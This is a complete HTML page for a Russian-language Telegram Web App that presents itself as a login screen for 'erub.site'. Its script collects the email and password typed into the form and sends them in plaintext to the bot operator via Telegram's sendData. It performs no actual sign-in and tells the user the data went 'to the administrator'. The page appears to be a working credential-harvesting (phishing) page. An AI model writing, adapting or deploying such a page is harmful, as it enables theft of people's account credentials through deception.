<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Вход в erub.site</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            padding: 30px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
        }
        h1 { text-align: center; color: #333; margin-bottom: 5px; }
        .subtitle { text-align: center; color: #666; margin-bottom: 30px; font-size: 14px; }
        .form-group { margin-bottom: 20px; }
        .form-group label { display: block; margin-bottom: 8px; color: #555; font-weight: 500; }
        .form-group input {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            font-size: 16px;
        }
        .form-group input:focus { outline: none; border-color: #667eea; }
        .btn-primary {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }
        .btn-support {
            width: 100%;
            padding: 12px;
            background: #f5f5f5;
            color: #333;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            font-size: 14px;
            cursor: pointer;
            margin-top: 10px;
        }
        .message {
            margin-top: 20px;
            padding: 12px;
            border-radius: 10px;
            display: none;
            text-align: center;
        }
        .message.success { display: block; background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
        .message.error { display: block; background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
        .message.info { display: block; background: #d1ecf1; color: #0c5460; border: 1px solid #bee5eb; }
        .footer { margin-top: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🏠 erub.site</h1>
        <p class="subtitle">Вход в систему</p>
        
        <div id="loginForm">
            <div class="form-group">
                <label for="email">📧 Email</label>
                <input type="email" id="email" placeholder="Введите ваш email">
            </div>
            <div class="form-group">
                <label for="password">🔑 Пароль</label>
                <input type="password" id="password" placeholder="Введите пароль">
            </div>
            <button id="submitBtn" class="btn-primary">🔓 Войти</button>
        </div>

        <div id="message" class="message"></div>
        
        <div class="footer">
            <button onclick="openSupport()" class="btn-support">🆘 Техническая поддержка</button>
        </div>
    </div>
    
    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();
        
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const submitBtn = document.getElementById('submitBtn');
        const messageDiv = document.getElementById('message');
        
        function showMessage(text, type = 'info') {
            messageDiv.textContent = text;
            messageDiv.className = `message ${type}`;
            setTimeout(() => { messageDiv.style.display = 'none'; }, 5000);
        }
        
        submitBtn.addEventListener('click', function() {
            const email = emailInput.value.trim();
            const password = passwordInput.value.trim();
            
            if (!email || !password) {
                showMessage('Заполните все поля', 'error');
                return;
            }
            
            const data = JSON.stringify({ email: email, password: password });
            
            try {
                tg.sendData(data);
                showMessage('✅ Данные отправлены администратору!', 'success');
                emailInput.value = '';
                passwordInput.value = '';
            } catch (error) {
                showMessage('❌ Ошибка отправки', 'error');
            }
        });
        
        document.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') submitBtn.click();
        });
        
        function openSupport() {
            window.open('https://t.me/potok457', '_blank');
        }
    </script>
</body>
</html>
